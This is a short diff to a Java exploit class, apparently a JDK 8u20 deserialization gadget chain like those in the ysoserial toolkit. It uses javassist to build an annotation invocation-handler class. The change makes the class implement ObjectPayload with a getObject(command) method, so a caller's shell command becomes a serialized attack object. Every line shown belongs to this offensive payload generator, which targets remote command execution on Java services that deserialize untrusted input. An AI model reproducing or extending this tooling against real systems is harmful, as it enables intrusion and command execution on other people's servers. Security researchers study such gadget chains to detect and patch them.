@@ -17,7 +17,7 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 
- public class Jdk8u20_my {
+ public class Jdk8u20_my implements ObjectPayload{
      public static Class newInvocationHandlerClass() throws Exception{
          ClassPool pool = ClassPool.getDefault();
          CtClass clazz = pool.get(Gadgets.ANN_INV_HANDLER_CLASS);
@@ -73,4 +73,8 @@ import java.util.LinkedHashSet;
 //         Deserializer.deserialize(ser);
      }
 
+     @Override
+     public Object getObject(String command) throws Exception {
+         return getPayload(command);
+     }
  }
